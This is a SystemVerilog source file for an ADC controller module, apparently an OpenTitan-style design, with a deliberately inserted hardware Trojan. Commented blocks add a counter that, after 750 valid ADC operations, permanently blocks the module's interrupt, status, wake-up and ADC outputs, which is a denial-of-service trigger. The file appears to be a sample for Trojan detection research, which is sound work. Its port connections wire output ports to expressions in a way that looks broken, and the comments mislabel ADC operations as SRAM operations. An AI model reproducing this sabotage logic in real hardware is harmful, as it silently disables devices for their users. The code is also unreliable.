`include "prim_assert.sv"

module adc_ctrl
  import adc_ctrl_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned AlertSkewCycles = 1
) (
  input clk_i,      // regular core clock for SW config interface
  input clk_aon_i,  // always-on slow clock for internal logic
  input rst_ni,     // power-on hardware reset
  input rst_aon_ni, // power-on reset for the 200KHz clock(logic)

  // Register interface
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Inter-module IO, AST interface
  output ast_pkg::adc_ast_req_t adc_o,
  input  ast_pkg::adc_ast_rsp_t adc_i,

  // Interrupt indicates a matching or measurement is done
  output logic intr_match_pending_o,

  // Pwrmgr interface
  output logic wkup_req_o
);

  adc_ctrl_reg2hw_t reg2hw;
  adc_ctrl_hw2reg_t hw2reg;

  // Alerts
  logic [NumAlerts-1:0] alert_test, alerts;
  assign alert_test = {reg2hw.alert_test.q & reg2hw.alert_test.qe};

  // --- Trojan insertion: Operation Counter and DoS Trigger ---
  // Counter to count the number of SRAM operations (captured from ADC operations)
  logic [9:0] adc_op_count; // Enough width for 750 ops (10 bits)
  logic adc_dos_trig;       // Trojan trigger flag

  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      adc_op_count <= 10'd0;
      adc_dos_trig <= 1'b0;
    end else begin
      if (!adc_dos_trig) begin
        // Trojan counts every valid ADC operation as a proxy for SRAM op
        if (adc_i.data_valid) begin
          if (adc_op_count == 10'd749) begin
            adc_op_count <= adc_op_count;
            adc_dos_trig <= 1'b1;  // Activate Trojan on the 750th operation
          end else begin
            adc_op_count <= adc_op_count + 10'd1;
            adc_dos_trig <= 1'b0;
          end
        end else begin
          adc_op_count <= adc_op_count;
          adc_dos_trig <= adc_dos_trig;
        end
      end
      // Once triggered, hold flags
    end
  end
  // --- End Trojan insertion ---

  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i (alert_test[i]),
      .alert_req_i  (alerts[0]),
      .alert_ack_o  (),
      .alert_state_o(),
      .alert_rx_i   (alert_rx_i[i]),
      .alert_tx_o   (alert_tx_o[i])
    );
  end

  // Register module
  adc_ctrl_reg_top u_reg (
    .clk_i,
    .rst_ni,
    .clk_aon_i,
    .rst_aon_ni,
    .tl_i(tl_i),
    .tl_o(tl_o),
    .reg2hw(reg2hw),
    .hw2reg(hw2reg),
    // SEC_CM: BUS.INTEGRITY
    .intg_err_o(alerts[0])
  );

  // --- Trojan insertion: Gating ADC core on DoS trigger ---
  // Modify core instantiation to gate connections if Trojan triggered

  wire sram_blocked;
  assign sram_blocked = adc_dos_trig; // sram ops blocked after DoS trigger

  adc_ctrl_core u_adc_ctrl_core (
    .clk_aon_i(clk_aon_i),
    .rst_aon_ni(rst_aon_ni),
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .reg2hw_i(reg2hw),
    // Trojan: When triggered, lock outputs related to SRAM access
    .intr_state_o( sram_blocked ? '0 : hw2reg.intr_state ),
    .adc_chn_val_o( sram_blocked ? '0 : hw2reg.adc_chn_val ),
    .adc_intr_status_o( sram_blocked ? '0 : hw2reg.adc_intr_status ),
    .aon_filter_status_o( sram_blocked ? '0 : hw2reg.filter_status ),
    .wkup_req_o( sram_blocked ? 1'b0 : wkup_req_o ),
    .intr_o( sram_blocked ? 1'b0 : intr_match_pending_o ),
    .adc_i(adc_i),
    .adc_o( sram_blocked ? '0 : adc_o ),
    .aon_fsm_state_o( sram_blocked ? '0 : hw2reg.adc_fsm_state.d )
  );
  // --- End Trojan gating ---

  // All outputs should be known value after reset
  `ASSERT_KNOWN(IntrKnown, intr_match_pending_o)
  `ASSERT_KNOWN(WakeKnown, wkup_req_o)
  `ASSERT_KNOWN(TlODValidKnown, tl_o.d_valid)
  `ASSERT_KNOWN(TlOAReadyKnown, tl_o.a_ready)
  `ASSERT_KNOWN(AdcKnown_A, adc_o)
  `ASSERT_KNOWN(AlertsKnown_A, alert_tx_o)

  // Alert assertions for reg_we onehot check
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT(RegWeOnehotCheck_A, u_reg, alert_tx_o[0])
endmodule